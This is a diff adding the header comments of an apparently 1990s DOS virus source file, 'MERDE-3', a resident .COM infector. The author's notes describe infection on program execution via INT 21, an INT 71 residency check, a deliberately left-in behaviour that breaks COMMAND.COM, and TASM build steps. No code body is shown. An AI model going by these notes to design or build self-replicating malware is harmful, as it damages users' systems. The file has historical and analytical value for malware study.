@@ -1,0 +1,24 @@
+;  MERDE-3:   A resident, non-overwriting .Com infector by the loki-nator
+
+;Well, here it is, for what it's worth..  It is really kind of a 
+;piece of crap, but it is just a rough draft..
+;NOTES:
+;  If this gets into Command.Com, it (command) won't work for unknown reasons..
+;  I could have fixed it by just checking to make sure the file it is infecting
+;  isn't command.com, but I decided that this would be it's harmful side effect
+;  and left it...  I will have to fix several things in it, like its memory 
+;  handling, etc... It only infects files when they are loaded for EXECUTION!
+;  it won't infect .com files loaded by debug via AX=4b03, or al=anything
+;  except 00.... Also, it hooks int 71 for its own type of multiplex
+;  interrupt to check if the resident portion is already installed..
+;  I don't know if that will get me in trouble or not.  This is not very well
+;  tested, so it may hand under some circumstances or ill-behaved programs
+;  that mess with the memory (like I did)...  Well, I need to add .exe 
+;  infection, or I will be just a wanna-be virus writer!
+;  At this very moment, I will probably modify it for infection of any function
+;  that gives INT 21 a DS:DX pointer to a com file.
+;  Oh, yeah- If you compile it, you have to run the included Maker.bat file
+;  after you have compiled it (Use Tasm, but I guess anything will work.)
+
+;  Any GOOD virus writers out there will obviously notice how inefficient this
+;  is, so if you do, leave me mail with some pointers....
